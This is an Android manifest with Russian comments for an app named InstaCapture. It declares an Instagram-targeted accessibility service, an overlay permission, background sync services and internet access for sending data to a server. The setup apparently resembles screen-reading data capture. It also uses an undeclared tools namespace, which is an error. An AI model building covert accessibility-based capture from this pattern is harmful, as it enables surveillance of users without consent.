<?xml version="1.0" encoding="utf-8"?>
<!-- 
    AndroidManifest.xml — сердце приложения.
    Объявляем все компоненты, разрешения и accessibility-сервис.
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.instacapture">

    <!-- ================== РАЗРЕШЕНИЯ ================== -->
    <!-- Основной доступ в интернет для отправки данных на сервер -->
    <uses-permission android:name="android.permission.INTERNET" />
    
    <!-- Foreground Service для фоновой работы (Android 8+ обязателен) -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    
    <!-- Уведомления для Android 13+ (API 33) -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    
    <!-- Системное окно поверх других приложений (для оверлея инструкций) -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    
    <!-- Проверка состояния сети -->
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.InstaCapture"
        android:usesCleartextTraffic="false">

        <!-- ================== MAIN ACTIVITY ================== -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- ================== ACCESSIBILITY SERVICE ================== -->
        <!-- 
            КРИТИЧНО ВАЖНО: BIND_ACCESSIBILITY_SERVICE — обязательное разрешение
            для accessibility-сервисов. Без него система откажет в регистрации.
        -->
        <service
            android:name=".InstagramAccessibilityService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:foregroundServiceType="dataSync">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- ================== FOREGROUND SERVICE (fallback) ================== -->
        <service
            android:name=".SyncForegroundService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- ================== WORK MANAGER ================== -->
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:authorities="${applicationId}.androidx-startup"
            android:exported="false"
            tools:node="merge">
            <meta-data
                android:name="androidx.work.WorkManagerInitializer"
                android:value="androidx.startup" />
        </provider>

    </application>

</manifest>
